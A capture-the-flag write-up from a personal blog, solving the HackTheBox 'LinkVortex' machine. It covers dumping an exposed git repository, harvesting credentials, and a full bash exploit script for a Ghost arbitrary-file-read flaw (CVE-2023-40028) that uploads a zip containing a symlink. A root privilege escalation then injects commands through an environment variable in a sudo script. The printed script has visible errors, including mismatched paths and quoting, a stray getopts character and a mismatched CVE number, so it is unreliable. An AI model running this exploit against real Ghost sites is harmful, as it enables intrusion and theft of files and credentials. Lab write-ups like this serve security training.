<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>LinkVortex-Linux-Easy | Pwn3d777</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="LinkVortex-Linux-Easy" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="LinkVortex" />
<meta property="og:description" content="LinkVortex" />
<link rel="canonical" href="https://your-site-url/writeups/2025/07/15/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463.html" />
<meta property="og:url" content="https://your-site-url/writeups/2025/07/15/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463.html" />
<meta property="og:site_name" content="Pwn3d777" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-15T16:05:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="LinkVortex-Linux-Easy" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-15T16:05:57+00:00","datePublished":"2025-07-15T16:05:57+00:00","description":"LinkVortex","headline":"LinkVortex-Linux-Easy","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/15/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463.html"},"url":"https://your-site-url/writeups/2025/07/15/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
        
        
        
        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">

<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
</div>

</div>


<div class="post">
  <h1 class="post-title">LinkVortex-Linux-Easy</h1>
  
  <div class="post-date">
    Published on 15 Jul 2025
    
  </div>
  
  <h1 id="linkvortex">LinkVortex</h1>

<h1 id="1-enumeration">1. Enumeration</h1>

<p>Start enumerating open ports</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image.png" alt="image.png" /></p>

<p>There are only two ports open, a web application is running on port 80, we can see there is information about hardware</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_1.png" alt="image.png" /></p>

<h1 id="2-user-flag">2. User flag</h1>

<p>Looking around we realise it is powered by ghost, which is an application for publisher to manage their business</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_2.png" alt="image.png" /></p>

<p>It is open source which means we can see their files in a git-hub repository</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_3.png" alt="image.png" /></p>

<p>In security section there are info about some vulnerabilities found previously, but by now we don’t have enough information to perform an attack</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_4.png" alt="image.png" /></p>

<p>Checking directories related with the repository we found a sign in page, it could be useful to find some credentials</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_5.png" alt="image.png" /></p>

<p>There is nothing much to do here, so let’s discover new subdomains to see if we could be able to get more information, fuzzing the HOST header we could find dev in v host, we could use: <a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_6.png" alt="image.png" /></p>

<p>It’s suppose to be in construction</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_7.png" alt="image.png" /></p>

<p>But getting information about directories, the whole repository is leaked here, making only curl request we won’t find what we need</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_8.png" alt="image.png" /></p>

<p>That’s when git-dumper tool gets into action dumpling all the files it could find and saving them to a directory in this case gdump</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_9.png" alt="image.png" /></p>

<p>First we try to get ghost version to see if there are some CVE’s on internet, it seems to be 4.0</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_10.png" alt="image.png" /></p>

<p>Then we try to grep recursively all “password” plain text, we can see a los of test passwords, those seems to be like default passwords</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_11.png" alt="image.png" /></p>

<p>There are even hashes</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_12.png" alt="image.png" /></p>

<p>Those are different passwords we can see if they are present in the public repository</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_13.png" alt="image.png" /></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_14.png" alt="image.png" /></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_15.png" alt="image.png" /></p>

<p>Effectively those passwords are present in the public files</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_16.png" alt="image.png" /></p>

<p>After keeping searching there is another password, it seems a different password</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_17.png" alt="image.png" /></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_18.png" alt="image.png" /></p>

<p>We see in the public files that this password is not  present which is a possible leakage, we tried to get in as admin or example or test in the graphical interface but we didn’t log in, password were wrong, search for vulnerabilities, there is an Arbitrary File Read with authenticated users and the version seems to be vulnerable</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_19.png" alt="image.png" /></p>

<p>Here we have the admin api where we also can authenticate as admin</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_20.png" alt="image.png" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c">#CVE-2023-40028</span>
<span class="c">#Ghost Arbitrary File Read</span>

<span class="nv">GHOST_URL</span><span class="o">=</span><span class="s1">'http://linkvortex.htb'</span>
<span class="c">#Administrator endpoint</span>
<span class="nv">GHOST_API</span><span class="o">=</span><span class="s2">"</span><span class="nv">$GHOST_URL</span><span class="s2">/ghost/api/v3/admin/"</span>
<span class="nv">API_VERSION</span><span class="o">=</span><span class="s1">'v3.0'</span>

<span class="c">#Generating a folder where the script is executed</span>
<span class="nv">PAYLOAD_PATH</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span><span class="nb">dirname</span> <span class="nv">$0</span><span class="sb">`</span><span class="s2">/exploit"</span>
<span class="c">#The name of the file</span>
<span class="nv">PAYLOAD_ZIP_NAME</span><span class="o">=</span>exploit.zip

<span class="c">#Function to print usage showing how to execute the script</span>
<span class="k">function </span>usage<span class="o">()</span> <span class="o">{</span>
	<span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$ </span><span class="s2">-u username -password"</span>
<span class="o">}</span>

<span class="c">#Reading arguments</span>
<span class="c">#waiting two arguments -u -p</span>
<span class="k">while </span><span class="nb">getopts</span> <span class="s1">'u:pÑ'</span> flag<span class="p">;</span> <span class="k">do</span>
	<span class="c">#Processing options </span>
	<span class="k">case</span> <span class="s2">"</span><span class="k">${</span><span class="nv">flag</span><span class="k">}</span><span class="s2">"</span> <span class="k">in</span>
		<span class="c">#Saving values in a variable</span>
		u<span class="p">)</span> <span class="nv">USERNAME</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">OPTARG</span><span class="k">}</span><span class="s2">"</span> <span class="p">;;</span>
		p<span class="p">)</span> <span class="nv">PASSWORD</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">OPTARG</span><span class="k">}</span><span class="s2">"</span> <span class="p">;;</span>
		<span class="c">#On error</span>
		<span class="k">*</span><span class="p">)</span> usage
			<span class="nb">exit</span> <span class="p">;;</span>
		<span class="k">esac</span>
	<span class="k">done</span>
	
<span class="c">#Checking if those variables are empty</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nt">-z</span> <span class="nv">$USERNAME</span> <span class="o">||</span> <span class="nt">-z</span> <span class="nv">$PASSWORD</span><span class="o">]]</span><span class="p">;</span> <span class="k">then
	</span>usage
	<span class="nb">exit
</span><span class="k">fi</span>

<span class="c">#Function to generate the payload</span>
<span class="k">function </span>generate_exploit<span class="o">()</span> <span class="o">{</span>
	<span class="c">#A local variables with the first argument of the funcion</span>
	<span class="nb">local </span><span class="nv">FILE_TO_READ</span><span class="o">=</span><span class="nv">$1</span>
	<span class="c">#Redirecting /dev/urandom to the standar input of tr</span>
	<span class="c">#tr translates those into alphanumeric string</span>
	<span class="c">#Getting only the firsts 13</span>
	<span class="nv">IMAGE_NAME</span><span class="o">=</span><span class="si">$(</span><span class="nb">tr</span> <span class="nt">-dc</span> A-Za-z0-9 &lt;/dev/urandom | <span class="nb">head</span> <span class="nt">-c</span> 13<span class="p">;</span> <span class="nb">echo</span><span class="si">)</span>
	<span class="c">#Creating the directory where the payload will be stored</span>
	<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="nv">$PAYLOAD_PATH</span>/content/images/2024/
	<span class="c">#Generating a symlink to the target file</span>
	<span class="nb">ln</span> <span class="nt">-s</span> <span class="nv">$FILE_TO_READ</span> <span class="nv">$PAYLOAD_PATH</span>/content/image/2024/<span class="nv">$IMAGE_NAME</span>.png
	<span class="c">#Zipping payload with the symlink</span>
	zip <span class="nt">-r</span> <span class="nt">-y</span> <span class="nv">$PAYLOAD_ZIP_NAME</span> <span class="nv">$PAYLOAD_PATH</span>/ &amp;&gt;/dev/null
<span class="o">}</span>

<span class="k">function </span>clean<span class="o">(){</span>
	<span class="nb">rm</span> <span class="nv">$PAYLOAD_PATH</span>/content/images/2024/<span class="nv">$IMAGE_NAME</span>.png
	<span class="nb">rm</span> <span class="nt">-ft</span> <span class="nv">$PAYLOAD_PATH</span>
	<span class="nb">rm</span> <span class="nv">$PAYLOAD_ZIP_NAME</span>
<span class="o">}</span>

<span class="c">#Sign into ghost and save cookie in cookie.txt</span>
curl <span class="nt">-c</span> cookie.txt <span class="nt">-d</span> <span class="nv">username</span><span class="o">=</span><span class="nv">$USERNAME</span> <span class="nt">-d</span> <span class="nv">password</span><span class="o">=</span><span class="nv">$PASSWORD</span> <span class="se">\</span>
	<span class="nt">-H</span> <span class="s2">"Origin: </span><span class="nv">$GHOST_URL</span><span class="s2">"</span> <span class="se">\</span>
	<span class="nt">-H</span> <span class="s2">"Accept-Version: v3.0"</span> <span class="se">\</span>
	<span class="c">#Creating a new session</span>
	<span class="nv">$GHOST_API</span>/session/ &amp;&gt; /dev/null

<span class="c">#Quiet check if cookie exists</span>
<span class="k">if</span> <span class="o">!</span> <span class="nb">cat </span>cookie.txt | <span class="nb">grep</span> <span class="nt">-q</span> ghost-admin-api-session<span class="p">;</span> <span class="k">then
	</span><span class="nb">echo</span> <span class="s2">"[!] INVALID CREDENTIALS"</span>
	<span class="nb">rm </span>cookie.txt
	<span class="nb">exit
</span><span class="k">fi

function </span>send_exploit<span class="o">()</span> <span class="o">{</span>
	<span class="nv">RES</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-b</span> cookie.txt<span class="se">\</span>
		<span class="nt">-H</span> <span class="s2">"Accept: text/plain, */*; q=0.01"</span> <span class="se">\</span>
		<span class="nt">-H</span> <span class="s2">"Accept-Language: en-US,en;q=0.5"</span> <span class="se">\</span>
		<span class="nt">-H</span> <span class="s2">"Accept-Encoding:"</span><span class="nb">gzip</span>, deflate, br<span class="s2">" </span><span class="se">\</span><span class="s2">
		-H "</span>X-Ghost-Version: 5.58<span class="s2">" </span><span class="se">\</span><span class="s2">
		-H "</span>App-Pragma: no-cache<span class="s2">" </span><span class="se">\</span><span class="s2">
		#Making a request from JS object
		-H "</span>X-Requested-With: XMLHttpRequest<span class="s2">" </span><span class="se">\</span><span class="s2">
		-H "</span>Content-Type: multipart/from-data<span class="s2">" </span><span class="se">\</span><span class="s2">
		-X POST</span><span class="se">\</span><span class="s2">
		-H "</span>Origin: <span class="nv">$GHOST_URL</span><span class="s2">" </span><span class="se">\</span><span class="s2">
		-H "</span>Referer: <span class="nv">$GHOST_URL</span>/ghost/<span class="s2">" </span><span class="se">\</span><span class="s2">
		-F "</span><span class="nv">importfile</span><span class="o">=</span>@<span class="sb">`</span><span class="nb">dirname</span> <span class="nv">$PAYLOAD_PATH</span><span class="sb">`</span>/PAYLOAD_ZIP_NAME<span class="p">;</span><span class="nb">type</span><span class="o">=</span>application/zip<span class="s2">" </span><span class="se">\</span><span class="s2">
		-H "</span>form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="se">\"</span>importfile<span class="se">\"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="se">\"</span><span class="nv">$PAYLOAD_ZIP_NAME</span><span class="se">\"</span><span class="s2">" </span><span class="se">\</span><span class="s2">
		-H "</span>Content-Type: application/zip<span class="s2">" </span><span class="se">\</span><span class="s2">
		"</span><span class="nv">$GHOST_URL</span>/ghost/api/v3/admin/db<span class="s2">")
	#Last command not equals to 0
	if [ </span><span class="nv">$?</span><span class="s2"> -ne 0]; then
		echo "</span><span class="o">[!]</span> FAILED TO SEND THE EXPLOIT<span class="s2">"
		clean
		exit
	fi
}
	
	
echo "</span>Welcome to the CVE-2023-40024 SHELL<span class="s2">"
#Creating a custom shell
while true; do
	#Display readline to pass an input
	read -p "</span>file&gt; <span class="s2">" INPUT
	#Exit the shell
	#[[]] supports ==
	if [[ </span><span class="nv">$INPUT</span><span class="s2"> == "</span><span class="nb">exit</span><span class="s2">"]];then
		echo "</span>Bye Bye!!<span class="s2">"
		break
	fi
	#Checking if input matches with a RE in this case a blank space
	if [[ </span><span class="nv">$INPUT</span><span class="s2"> =~ </span><span class="se">\ </span><span class="s2"> ]]; then
		echo "</span>PLEASE ENTER FULL FILE PATH WITHOUT SPACE<span class="s2">"
		continue
	fi
	#Valid input is not empty
	if [ -z </span><span class="nv">$INPUT</span><span class="s2"> ];then
		echo "</span>VALUE REQUIRED<span class="s2">"
		continue
	fi
	#Generate payload with the input
	generate_exploit </span><span class="nv">$INPUT</span><span class="s2">
	#Sending the malicious .zip file
	send_exploit 
	#Read the file uploaded
	curl -b cookie.txt -s </span><span class="nv">$GHOST_URL</span><span class="s2">/content/images/2024/</span><span class="nv">$IMAGE_NAME</span><span class="s2">.png
	clean
done

rm cookie.txt
	
</span></code></pre></div></div>

<p>Execute the exploit and confirm the arbitrary file read</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_21.png" alt="image.png" /></p>

<p>Now it’s time to find creds or something valuable it might be in config files</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_22.png" alt="image.png" /></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_23.png" alt="image.png" /></p>

<p>We know the name of the config file but we don’t where it is, chat gpt helps us to find routes, in docker containers the config file is stored in</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_24.png" alt="image.png" /></p>

<p>Effectively there it is, use credentials found in ssh to get user flag</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_25.png" alt="image.png" /></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_26.png" alt="image.png" /></p>

<h1 id="3priv-esc">3.Priv esc</h1>

<p>Privilege escalation is pretty straightforward, first check at commands or scripts we can execute as root</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_27.png" alt="image.png" /></p>

<p>We have this script and we have certain control of CHECK_CONTENT environment variable also it  won’t reset itself to default values</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_28.png" alt="image.png" /></p>

<p>We can analyze <code class="language-plaintext highlighter-rouge">clean_symlink.sh</code></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_29.png" alt="image.png" /></p>

<p>Basically it is receiving a .png file which is a symbolic link, this symlink is sanitized avoiding getting files that only root should have access, but the environment variable CHECK_CONTENT is not taking account here and we can set that variable to execute the commands we want to, it is only checking that this variable is not empty</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_30.png" alt="image.png" /></p>

<p>We can see an example here, if that variable has a command catting a file in root folder it will read it, enter into the conditional statement if that script is executed with elevated privileges</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_31.png" alt="image.png" /></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_32.png" alt="image.png" /></p>

<p>Make a symbolic link of a .png file to make the script work as expected and set the env variable catting the private key, that’s how this machine is pwned</p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_33.png" alt="image.png" /></p>

<p><img src="/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_34.png" alt="image.png" /></p>

<p>Machine pwned!!!
<script src="/assets/js/matrix-overlay.js"></script></p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://your-site-url/writeups/2025/07/15/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463.html';
     this.page.identifier = '/writeups/2025/07/15/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463';
     this.page.title = 'LinkVortex-Linux-Easy';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
            Dog-Linux-Easy
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
            Titanic-Linux-Easy
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
            Cat-Linux-Medium
          </a>
        </h3>
      </li>
    
  </ul>
</div>






<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
